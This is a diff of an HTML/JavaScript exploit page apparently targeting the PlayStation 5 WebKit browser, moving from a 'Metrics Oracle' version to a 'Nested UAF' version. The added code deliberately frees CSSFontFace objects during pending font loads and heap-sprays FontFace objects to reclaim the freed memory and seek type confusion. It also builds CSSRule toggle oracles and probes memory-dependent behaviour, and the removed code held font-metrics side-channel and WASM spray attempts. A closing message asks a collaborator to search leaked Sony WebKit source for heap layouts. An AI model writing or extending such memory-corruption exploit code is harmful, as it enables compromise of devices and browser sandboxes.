@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v26 - Metrics Oracle</title>
+<title>PS5 v27 - Nested UAF</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -34,11 +34,11 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v26 METRICS</span><span class="s">│</span>
+<span class="l">▶ v27 NESTED</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h3">RC:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h4">METRICS:<b>?</b></span>
+<span class="v" id="h4">NESTED:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
@@ -46,13 +46,33 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 <script>
 "use strict";
 
+// ============================================================
+//  PS5 v27 — Nested UAF
+//
+//  STRATEGY:
+//  Use the CSSRule primitive to create a NEW CSSFontFace,
+//  then FREE it during load() → second UAF!
+//
+//  The difference: this CSSFontFace was created via CSSOM
+//  (not FontFace JS API). It might use a different allocation
+//  path or IsoHeap bucket.
+//
+//  PLAN:
+//  1. Standard UAF + CSSRule for "x" (proven)
+//  2. Start load("64px x", "B") — async
+//  3. While load is pending, delete the CSSRule
+//  4. Spray objects to reclaim the freed CSSFontFace
+//  5. When load resolves, check what we got
+//  6. If we got a different object type = TYPE CONFUSION!
+// ============================================================
+
 var O=document.getElementById("out");
 var bar=document.getElementById("bar");
 function pg(p){bar.style.width=p+"%"}
 function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
 function P(m,c){var s=document.createElement("span");if(c)s.className=c;
 s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v26] "+m)}catch(e){}}
+try{console.log("[v27] "+m)}catch(e){}}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
 function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
 function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
@@ -110,38 +130,9 @@ unicodeRange:"U+0041",style:"italic",weight:"900"});
 document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
 if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
-// Helper: Measure ALL TextMetrics
-function measureAll(fontSpec, text) {
-try {
-ctx.font = fontSpec;
-var m = ctx.measureText(text);
-return {
-width: m.width,
-actualBoundingBoxAscent: m.actualBoundingBoxAscent,
-actualBoundingBoxDescent: m.actualBoundingBoxDescent,
-actualBoundingBoxLeft: m.actualBoundingBoxLeft,
-actualBoundingBoxRight: m.actualBoundingBoxRight,
-fontBoundingBoxAscent: m.fontBoundingBoxAscent,
-fontBoundingBoxDescent: m.fontBoundingBoxDescent
-};
-} catch(e) {
-return {error: e.message};
-}
-}
-
-// Helper: Create font with modified bytes at specific offset
-function makeFontModified(offset, value) {
-var buf = new ArrayBuffer(FBb.length);
-var src = new Uint8Array(buf);
-src.set(FBb);
-var view = new DataView(buf);
-if (offset + 2 <= buf.byteLength) {
-view.setUint16(offset, value & 0xFFFF, true);
-}
-return buf;
-}
-
-// Capture
+// ============================================================
+//  Capture
+// ============================================================
 document.fonts.load("1em trigger, x","AB").then(function(faces){
 for(var i=0;i<faces.length;i++){
 var f=faces[i];
@@ -163,357 +154,437 @@ xRule=sh.cssRules[xRuleIdx];
 Ok("CSSRule for 'x' ready");
 
 // ============================================================
-//  PHASE 1: Baseline TextMetrics
+//  PHASE 1: Nested UAF — Delete CSSRule during load
 // ============================================================
-pg(10);Sep();Hd("PHASE 1: Baseline TextMetrics");Sep();
+pg(15);Sep();Hd("PHASE 1: Nested UAF via CSSRule");Sep();
 
-var baseline = measureAll("64px x", "BBBB");
-P("  Baseline metrics for '64px x' on 'BBBB':","dm");
-for (var key in baseline) {
-P("    " + key.padEnd(32) + " = " + baseline[key],
-typeof baseline[key] === "number" && baseline[key] !== 0 ? "hl" : "dm");
-}
-
-// Compare with known fonts
-P("");
-P("  Comparison with known fonts:","dm");
-var knownFonts = ["Helvetica", "Courier", "Arial", "serif", "monospace"];
-for (var fi=0; fi<knownFonts.length; fi++) {
-var km = measureAll("64px " + knownFonts[fi], "BBBB");
-P("    " + knownFonts[fi].padEnd(12) + " width=" + km.width +
-" asc=" + (km.actualBoundingBoxAscent||0) +
-" desc=" + (km.actualBoundingBoxDescent||0),
-km.width !== baseline.width ? "hl" : "dm");
-}
-
-// ============================================================
-//  PHASE 2: Change RC face font data → re-measure
-// ============================================================
-pg(25);Sep();Hd("PHASE 2: Font Data → Metrics");Sep();
-
-P("  Testing if changing font data changes metrics...","dm");
+P("  Strategy: Start load('64px x','B'), then delete CSSRule","dm");
 P("");
 
-// Test: modify different byte offsets in the font
-var offsets = [0, 4, 8, 16, 32, 64, 128, 256, 512];
-var widthResults = [];
+// Step 1: Start load (async)
+P("  Step 1: Starting load('64px x', 'B')...","dm");
+var loadPromise = document.fonts.load("64px x", "B");
 
-for (var oi=0; oi<offsets.length; oi++) {
-var off = offsets[oi];
+// Step 2: Immediately delete the CSSRule (FREE the CSSFontFace)
+P("  Step 2: Deleting CSSRule during pending load...","dm");
 try {
-// Create modified font
-var modBuf = makeFontModified(off, 0xFFFF);
-
-// Delete old RC, create new with modified data
-document.fonts.delete(rcFace);
-var newRC = new FontFace("RC_" + rcIdx, modBuf, {
-unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
-});
-document.fonts.add(newRC);
+sh.deleteRule(xRuleIdx);
 fs();
-keep.push(newRC);
-rcFace = newRC;
-
-// Measure
-var m = measureAll("64px x", "B");
-widthResults.push({offset: off, width: m.width});
-P("  off=" + String(off).padStart(4) +
-" → width=" + m.width.toFixed(2) +
-" asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
-" desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
-m.width !== baseline.width ? "hl" : "dm");
-
+Ok("CSSRule deleted during load");
 } catch(e) {
-P("  off=" + off + " → ERR: " + e.message.substring(0,30), "er");
+Fl("Delete: " + e.message);
+}
+
+// Step 3: Spray to reclaim the freed CSSFontFace
+P("  Step 3: Spraying to reclaim freed CSSFontFace...","dm");
+
+// Spray FontFace objects (same IsoHeap type)
+var nestedSpray = [];
+for (var i = 0; i < 2048; i++) {
+try {
+var f = new FontFace("NEST_" + i, mkBuf(), {
+unicodeRange: "U+0042",
+style: i % 2 === 0 ? "normal" : "italic",
+weight: String([100, 300, 500, 700, 900][i % 5]),
+display: ["auto", "block", "swap", "fallback"][i % 4]
+});
+document.fonts.add(f);
+nestedSpray.push(f);
+} catch(e) {}
+}
+fs();
+Ok("Sprayed " + nestedSpray.length + " NEST faces");
+
+// GC pressure
+for (var i = 0; i < 4; i++) {
+var tmp = [];
+for (var j = 0; j < 256; j++) tmp.push(new ArrayBuffer(4096));
+}
+
+// Step 4: Wait for load to resolve
+P("  Step 4: Waiting for load to resolve...","dm");
+
+loadPromise.then(function(faces) {
+P("  Load resolved with " + faces.length + " faces","hl");
+for (var i = 0; i < faces.length; i++) {
+var f = faces[i];
+P("    [" + i + "] family=" + f.family + " style=" + f.style +
+" weight=" + f.weight + " status=" + f.status, "hl");
+
+// Check if a NEST face appeared!
+if (f.family && f.family.indexOf("NEST_") === 0) {
+St("NEST FACE FOUND IN LOAD RESULT!");
+Hi("  Nested UAF + reclamation CONFIRMED!");
+Hi("  The freed CSSFontFace was reclaimed by " + f.family);
 }
 }
 
-// Check if any metrics changed
-var widthsChanged = false;
-for (var i=1; i<widthResults.length; i++) {
-if (widthResults[i].width !== widthResults[0].width) {
-widthsChanged = true;
-break;
+// Check if faces have unexpected properties
+for (var i = 0; i < faces.length; i++) {
+var f = faces[i];
+try {
+// If the CSSFontFace was freed and reclaimed,
+// properties might be corrupted
+var fam = f.family;
+var st = f.status;
+var w = f.weight;
+var s = f.style;
+
+// Look for mismatched or impossible values
+if (fam === "x" && w !== "400") {
+Hi("PROPERTY MISMATCH: family=x but weight=" + w);
+}
+if (fam === "x" && s !== "normal") {
+Hi("PROPERTY MISMATCH: family=x but style=" + s);
+}
+if (st === "error") {
+Hi("ERROR STATUS on face " + fam);
+}
+} catch(e) {
+Hi("ACCESS ERROR on face[" + i + "]: " + e.message);
 }
 }
 
-if (widthsChanged) {
-St("METRICS CHANGE WITH FONT DATA!");
-Hi("Font data → metrics side channel found!");
+// Keep references
+keep.push(faces);
+keep.push(nestedSpray);
+
+// Continue to phase 2
+phase2();
+}).catch(function(e) {
+Fl("Load error: " + e.message);
+Hi("Load REJECTED = possible UAF effect!");
+phase2();
+});
+
+// ============================================================
+//  PHASE 2: Multiple rapid delete+spray cycles
+// ============================================================
+function phase2() {
+pg(30);Sep();Hd("PHASE 2: Rapid Delete+Spray Cycles");Sep();
+
+P("  Testing rapid CSSRule add/delete cycles...","dm");
+P("");
+
+var cycleResults = [];
+
+for (var cycle = 0; cycle < 5; cycle++) {
+try {
+// Add CSSRule
+var idx = sh.insertRule(
+"@font-face{font-family:x;src:local(Courier);font-weight:" +
+(100 + cycle * 200) + ";unicode-range:U+0042}",
+sh.cssRules.length);
+fs();
+
+// Start load (don't await)
+var lp = document.fonts.load("64px x", "B");
+
+// Immediately delete
+sh.deleteRule(idx);
+fs();
+
+// Spray
+var cycSpray = [];
+for (var i = 0; i < 256; i++) {
+try {
+var f = new FontFace("C" + cycle + "_" + i, mkBuf(), {
+unicodeRange: "U+0042",
+weight: String(100 + cycle * 200)
+});
+document.fonts.add(f);
+cycSpray.push(f);
+} catch(e) {}
+}
+fs();
+
+// Check result
+lp.then(function(faces) {
+var result = {
+cycle: cycle,
+faceCount: faces.length,
+families: faces.map(function(f) { return f.family; }).join(",")
+};
+cycleResults.push(result);
+
+P("  Cycle " + cycle + ": " + faces.length + " faces [" +
+result.families.substring(0, 40) + "]",
+faces.length > 0 ? "hl" : "dm");
+
+// Check for C faces
+for (var i = 0; i < faces.length; i++) {
+if (faces[i].family && faces[i].family.indexOf("C" + cycle + "_") === 0) {
+St("CYCLE " + cycle + " RECLAIMED: " + faces[i].family);
+}
+}
+}).catch(function(e) {
+P("  Cycle " + cycle + ": REJECTED","er");
+});
+
+keep.push(cycSpray);
+} catch(e) {
+P("  Cycle " + cycle + ": ERR " + e.message.substring(0,30),"er");
+}
+}
+
+// Wait a bit then continue
+setTimeout(phase3, 500);
+}
+
+// ============================================================
+//  PHASE 3: CSSRule delete + check() oracle
+//  Add rule → check=false, delete rule → check=true
+// ============================================================
+function phase3() {
+pg(50);Sep();Hd("PHASE 3: CSSRule toggle oracle");Sep();
+
+P("  Testing rapid CSSRule add/delete as oracle...","dm");
+P("");
+
+// Baseline: no CSSRule for "x"
+var baseChk = document.fonts.check("64px x", "B");
+P("  Baseline (no rule): check=" + baseChk, baseChk ? "hl" : "dm");
+
+// Add rule
+var r1 = sh.insertRule(
+"@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}",
+sh.cssRules.length);
+fs();
+var addChk = document.fonts.check("64px x", "B");
+P("  After add rule: check=" + addChk, addChk ? "hl" : "dm");
+
+// Delete rule
+sh.deleteRule(r1);
+fs();
+var delChk = document.fonts.check("64px x", "B");
+P("  After delete rule: check=" + delChk, delChk ? "hl" : "dm");
+
+// Re-add
+var r2 = sh.insertRule(
+"@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}",
+sh.cssRules.length);
+fs();
+var readdChk = document.fonts.check("64px x", "B");
+P("  After re-add: check=" + readdChk, readdChk ? "hl" : "dm");
+
+// Re-delete
+sh.deleteRule(r2);
+fs();
+var redesChk = document.fonts.check("64px x", "B");
+P("  After re-delete: check=" + redesChk, redesChk ? "hl" : "dm");
+
+// Analysis
+P("");
+if (addChk !== delChk) {
+Hi("CSSRule toggle changes check() behavior!");
+Hi("This is a 1-bit oracle via CSSRule add/delete!");
+}
+
+// ============================================================
+//  PHASE 4: Rapid toggle with property encoding
+// ============================================================
+pg(65);Sep();Hd("PHASE 4: Property Encoding via Toggle");Sep();
+
+P("  Testing if we can encode data via rapid toggle...","dm");
+P("");
+
+// Encode bits: 1 = add rule (check=false), 0 = no rule (check=true)
+var bits = [1, 0, 1, 1, 0, 1, 0, 0];
+var decoded = [];
+
+for (var bi = 0; bi < bits.length; bi++) {
+try {
+if (bits[bi] === 1) {
+sh.insertRule(
+"@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}",
+sh.cssRules.length);
 } else {
-Wr("Metrics did NOT change with font data");
+// Delete last rule if it's for "x"
+var lastIdx = sh.cssRules.length - 1;
+if (lastIdx >= 0) {
+try { sh.deleteRule(lastIdx); } catch(e) {}
+}
+}
+fs();
+
+var chk = document.fonts.check("64px x", "B");
+// check=false → bit=1 (rule present)
+// check=true → bit=0 (rule absent)
+var bit = chk ? 0 : 1;
+decoded.push(bit);
+
+P("  Sent " + bits[bi] + " → check=" + chk + " → bit=" + bit,
+bits[bi] === bit ? "ok" : "er");
+} catch(e) {
+P("  Bit " + bi + ": ERR","er");
+decoded.push(-1);
+}
+}
+
+P("");
+P("  Sent:    " + bits.join(""));
+P("  Got:     " + decoded.join(""));
+var match = bits.every(function(b, i) { return b === decoded[i]; });
+P("  Match:   " + (match ? "YES!" : "NO"), match ? "ok" : "er");
+
+// ============================================================
+//  PHASE 5: Use toggle oracle to detect memory state
+//  If we can make the oracle depend on memory content...
+// ============================================================
+pg(80);Sep();Hd("PHASE 5: Memory-Dependent Oracle");Sep();
+
+P("  Testing if oracle can read memory state...","dm");
+P("");
+
+// The idea: if we spray objects between toggle operations,
+// and the CSSFontSelector's HashMap entry points to freed memory,
+// then adding/removing CSSRule might behave differently
+// depending on what's in the freed slot
+
+P("  Test 1: Toggle without spray","");
+var results1 = [];
+for (var i = 0; i < 10; i++) {
+try {
+var idx = sh.insertRule("@font-face{font-family:x;src:local(Courier);unicode-range:U+0042}", sh.cssRules.length);
+fs();
+var c1 = document.fonts.check("64px x", "B");
+sh.deleteRule(idx);
+fs();
+var c2 = document.fonts.check("64px x", "B");
+results1.push(c1 ? "1" : "0");
+} catch(e) {
+results1.push("E");
+}
+}
+P("  No spray: " + results1.join(""), "dm");
+
+P("");
+P("  Test 2: Toggle with spray between each","");
+var results2 = [];
+for (var i = 0; i < 10; i++) {
+try {
+var idx = sh.insertRule("@font-face{font-family:x;src:local(Courier);unicode-range:U+0042}", sh.cssRules.length);
+fs();
+var c1 = document.fonts.check("64px x", "B");
+sh.deleteRule(idx);
+fs();
+
+// Spray between operations
+var s = [];
+for (var j = 0; j < 64; j++) {
+s.push(new ArrayBuffer(128));
+}
+
+var c2 = document.fonts.check("64px x", "B");
+results2.push(c1 ? "1" : "0");
+} catch(e) {
+results2.push("E");
+}
+}
+P("  With spray: " + results2.join(""), "dm");
+
+P("");
+if (results1.join("") !== results2.join("")) {
+St("SPRAY AFFECTS ORACLE BEHAVIOR!");
+Hi("Memory content influences check() results!");
+} else {
+P("  No difference — oracle not memory-dependent","dm");
 }
 
 // ============================================================
-//  PHASE 3: Direct "x" measurement with different chars
+//  PHASE 6: Re-add CSSRule with modified properties
+//  After nested UAF, try to read back
 // ============================================================
-pg(40);Sep();Hd("PHASE 3: Character Variation");Sep();
+pg(90);Sep();Hd("PHASE 6: Post-UAF Property Read");Sep();
 
-// Restore original RC
+P("  Re-adding CSSRule and reading properties...","dm");
+P("");
+
+// Add CSSRule with specific weight
+var testWeights = ["100", "300", "500", "700", "900"];
+for (var wi = 0; wi < testWeights.length; wi++) {
 try {
-document.fonts.delete(rcFace);
-var origRC = new FontFace("RC_" + rcIdx, mkBuf(), {
-unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
+var w = testWeights[wi];
+var idx = sh.insertRule(
+"@font-face{font-family:x;src:local(Courier);font-weight:" + w + ";unicode-range:U+0042}",
+sh.cssRules.length);
+fs();
+
+// Read via load()
+document.fonts.load("64px x", "B").then(function(faces) {
+var xF = null;
+for (var i = 0; i < faces.length; i++) {
+if (faces[i].family === "x") { xF = faces[i]; break; }
+}
+if (xF) {
+P("  Write " + w + " → Read " + xF.weight,
+xF.weight === w ? "ok" : "hl");
+if (xF.weight !== w) {
+Hi("MISMATCH after nested UAF!");
+}
+}
 });
-document.fonts.add(origRC);
+
+// Clean up
+sh.deleteRule(idx);
 fs();
-keep.push(origRC);
-rcFace = origRC;
-} catch(e) {}
-
-P("  Measuring different characters with '64px x':","dm");
-P("");
-
-var testChars = [
-{ch: "B", code: "U+0042"},
-{ch: "A", code: "U+0041"},
-{ch: "C", code: "U+0043"},
-{ch: "W", code: "U+0057"},
-{ch: "M", code: "U+004D"},
-{ch: "i", code: "U+0069"},
-{ch: "0", code: "U+0030"},
-{ch: "\u00C0", code: "U+00C0"}
-];
-
-for (var ci=0; ci<testChars.length; ci++) {
-var tc = testChars[ci];
-var m = measureAll("64px x", tc.ch);
-P("  " + tc.code + " '" + tc.ch + "' → width=" + m.width.toFixed(2) +
-" asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
-" desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
-m.width > 0 ? "hl" : "dm");
-}
-
-// ============================================================
-//  PHASE 4: WASM Gigacage Spray
-// ============================================================
-pg(55);Sep();Hd("PHASE 4: WASM Gigacage Spray");Sep();
-
-P("  Setting up WASM memories...","dm");
-var wasmMemories = [];
-
-try {
-var wasmCode = new Uint8Array([
-0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
-0x05,0x03,0x01,0x00,0x01,
-0x07,0x08,0x01, 0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00
-]);
-
-var wasmModule = new WebAssembly.Module(wasmCode);
-
-for (var i=0; i<32; i++) {
-var inst = new WebAssembly.Instance(wasmModule);
-var mem = inst.exports.memory;
-var view = new DataView(mem.buffer);
-
-// Write marker pattern
-view.setUint32(0, 0xDEAD0000 | i, true);
-view.setUint32(4, 0xCAFEBABE, true);
-
-// Write fake hmtx data
-view.setUint16(0x100, 5000 + i, true);
-view.setUint16(0x104, 3000 + i, true);
-
-// Write fake head data
-view.setUint32(0x200, 0x00010000, false);
-view.setUint16(0x212, 1000 + i, false);
-view.setUint16(0x224, 500 + i, false);
-view.setUint16(0x226, 700 + i, false);
-
-wasmMemories.push({mem: mem, view: view, index: i});
-}
-
-Ok("32 WASM memories allocated");
-P("  Total: " + (wasmMemories.length * 64) + "KB","dm");
-
-// Re-measure after WASM spray
-P("");
-P("  Re-measuring '64px x' after WASM spray:","dm");
-var beforeWasm = measureAll("64px x", "B");
-
-// We need to trigger font reload to pick up WASM data
-// Delete and re-add RC face
-try {
-document.fonts.delete(rcFace);
-var wasmRC = new FontFace("RC_" + rcIdx, mkBuf(), {
-unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
-});
-document.fonts.add(wasmRC);
-fs();
-keep.push(wasmRC);
-rcFace = wasmRC;
-} catch(e) {}
-
-var afterWasm = measureAll("64px x", "B");
-P("  Before WASM: width=" + beforeWasm.width.toFixed(2) +
-" asc=" + (beforeWasm.actualBoundingBoxAscent||0).toFixed(2),
-"dm");
-P("  After WASM:  width=" + afterWasm.width.toFixed(2) +
-" asc=" + (afterWasm.actualBoundingBoxAscent||0).toFixed(2),
-Math.abs(afterWasm.width - beforeWasm.width) > 0.01 ? "hl" : "dm");
-
-if (Math.abs(afterWasm.width - beforeWasm.width) > 0.01) {
-St("METRICS CHANGED AFTER WASM SPRAY!");
-Hi("Font data may overlap with WASM memory!");
-}
-
 } catch(e) {
-Fl("WASM: " + e.message);
-}
-
-// ============================================================
-//  PHASE 5: unitsPerEm variation
-// ============================================================
-pg(70);Sep();Hd("PHASE 5: unitsPerEm Variation");Sep();
-
-P("  Testing unitsPerEm changes...","dm");
-P("");
-
-// Modify font at various offsets to find head table
-var upemOffsets = [];
-for (var off=0; off<FBb.length-2; off++) {
-// Look for potential unitsPerEm field (typically 1000 or 2048)
-if (FBb[off] === 0x03 && FBb[off+1] === 0xE8) { // 1000
-upemOffsets.push(off);
+P("  Weight " + w + ": ERR","er");
 }
 }
-
-P("  Found " + upemOffsets.length + " potential unitsPerEm locations (value=1000)","dm");
-
-// Try modifying each
-for (var ui=0; ui<Math.min(upemOffsets.length, 5); ui++) {
-var upemOff = upemOffsets[ui];
-try {
-var modBuf = new ArrayBuffer(FBb.length);
-var src = new Uint8Array(modBuf);
-src.set(FBb);
-var view = new DataView(modBuf);
-
-// Change unitsPerEm from 1000 to 8000
-view.setUint16(upemOff, 8000, false);
-
-document.fonts.delete(rcFace);
-var upemRC = new FontFace("RC_" + rcIdx, modBuf, {
-unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
-});
-document.fonts.add(upemRC);
-fs();
-keep.push(upemRC);
-rcFace = upemRC;
-
-var m = measureAll("64px x", "B");
-P("  upemOff=" + String(upemOff).padStart(4) + " → width=" + m.width.toFixed(2) +
-" asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
-" desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
-"dm");
-
-} catch(e) {
-P("  upemOff=" + upemOff + " → ERR","er");
-}
-}
-
-// ============================================================
-//  PHASE 6: DOM offsetWidth Oracle
-// ============================================================
-pg(80);Sep();Hd("PHASE 6: DOM offsetWidth Oracle");Sep();
-
-P("  Testing DOM element width...","dm");
-P("");
-
-var domTests = [
-{font: "64px x", text: "B"},
-{font: "64px trigger", text: "A"},
-{font: "64px Helvetica", text: "B"},
-{font: "64px Courier", text: "B"},
-{font: "900 italic 64px x", text: "B"},
-{font: "100 normal 64px x", text: "B"}
-];
-
-for (var di=0; di<domTests.length; di++) {
-var t = domTests[di];
-try {
-var d = document.createElement("div");
-d.textContent = t.text;
-d.style.cssText = "position:absolute;left:-9999px;font:" + t.font + ";";
-document.body.appendChild(d);
-var w = d.offsetWidth;
-var h = d.offsetHeight;
-P("  " + t.font.padEnd(28) + " '" + t.text + "' → w=" + w + " h=" + h,
-w > 0 ? "hl" : "dm");
-document.body.removeChild(d);
-} catch(e) {
-P("  " + t.font + " → ERR","er");
-}
-}
-
-// ============================================================
-//  PHASE 7: unicode-range Oracle
-// ============================================================
-pg(90);Sep();Hd("PHASE 7: unicode-range Oracle");Sep();
-
-P("  Testing unicode-range per codepoint...","dm");
-P("");
-
-var rangeTests = [
-{range: "U+0041", char: "A", name: "U+0041"},
-{range: "U+0042", char: "B", name: "U+0042"},
-{range: "U+0043", char: "C", name: "U+0043"},
-{range: "U+0061", char: "a", name: "U+0061"},
-{range: "U+0030", char: "0", name: "U+0030"},
-{range: "U+E000", char: "\uE000", name: "U+E000"}
-];
-
-// We'll use synchronous check() for this
-for (var ri=0; ri<rangeTests.length; ri++) {
-var rt = rangeTests[ri];
-try {
-xRule.style.unicodeRange = rt.range;
-xRule.style.fontWeight = "400";
-fs();
-
-// Use check() as oracle
-var chk = document.fonts.check("64px x", rt.char);
-
-// Also measure
-ctx.font = "64px x";
-var w = ctx.measureText(rt.char).width;
-
-P("  " + rt.name.padEnd(10) + " char='" + rt.char + "' → check=" + chk +
-" width=" + w.toFixed(2),
-chk ? "hl" : "dm");
-} catch(e) {
-P("  " + rt.name + " → ERR: " + e.message.substring(0,30),"er");
-}
-}
-
-// Restore
-try { xRule.style.unicodeRange = "U+0042"; fs(); } catch(e) {}
 
 // ============================================================
 //  SUMMARY
 // ============================================================
 pg(100);Sep();Hd("FINAL SUMMARY");Sep();
 P("");
-P("  UAF:                  ✅");
-P("  RC captured:          RC_" + rcIdx);
-P("  CSSRule for 'x':      ✅");
-P("  TextMetrics measured: ✅");
-P("  Font data variation:  " + (widthsChanged ? "✅ CHANGED!" : "❌ no change"));
-P("  WASM spray:           " + (wasmMemories.length > 0 ? wasmMemories.length + " memories" : "failed"));
-P("  DOM offsetWidth:      Tested");
-P("  unicode-range oracle: Tested");
+P("  UAF:              ✅");
+P("  RC captured:      RC_" + rcIdx);
+P("  CSSRule toggle:   " + (addChk !== delChk ? "✅" : "❌"));
+P("  Nested UAF:       See Phase 1-2 results");
+P("  Toggle oracle:    See Phase 3-4 results");
+P("  Memory-dependent: " + (results1.join("") !== results2.join("") ? "✅" : "❌"));
 P("");
+P("  Key questions:","hl");
+P("  1. Did NEST face appear in load result?","dm");
+P("  2. Does CSSRule toggle work as oracle?","dm");
+P("  3. Does spray affect oracle behavior?","dm");
+hu("h4","NESTED:<b>DONE</b>");
 
-if (widthsChanged) {
-St("FONT DATA → METRICS SIDE CHANNEL!");
-P("  Next: encode addresses in font tables","hl");
-P("  Read back via measureText() = memory read!","hl");
-hu("h4","METRICS:<b>READ!</b>");
-} else {
-P("  Metrics did NOT change with font data.","wr");
-P("  Browser uses fallback for metrics.","dm");
-hu("h4","METRICS:<b>FALLBACK</b>");
+// Cleanup nested spray
+for (var i = 0; i < nestedSpray.length; i++) {
+try { document.fonts.delete(nestedSpray[i]); } catch(e) {}
 }
+}
+
+// ============================================================
+//  Also: Search for WebKit source files LO has
+// ============================================================
+P("");
+P("════════════════════════════════════","hd");
+P("  WEBKIT SOURCE REQUEST","hd");
+P("════════════════════════════════════","hd");
+P("");
+P("  LO: You mentioned WebKit 1200 source from Sony.","hl");
+P("  Please search for these files:","hl");
+P("");
+P("  1. Source/WebCore/css/CSSFontFace.cpp");
+P("  2. Source/WebCore/css/CSSFontSelector.cpp");
+P("  3. Source/WebCore/css/FontFaceSet.cpp");
+P("  4. Source/WebCore/css/CSSFontFaceRule.cpp");
+P("");
+P("  Key things to look for:","hl");
+P("  - CSSFontFace class layout (member variables)");
+P("  - CSSFontSelector HashMap implementation");
+P("  - FontFaceSet::load() function");
+P("  - CSSFontFace::pump() function");
+P("  - How deleteRule() frees CSSFontFace");
+P("");
+P("  Also look for:","hl");
+P("  - IsoHeap assignments (MAKE_ISO_ALLOCATED)");
+P("  - bmalloc bucket sizes for CSSFontFace");
+P("  - Reference counting (RefPtr/Ref)");
+P("");
 
 }).catch(function(e){Fl("Load: "+e.message)});
 </script>
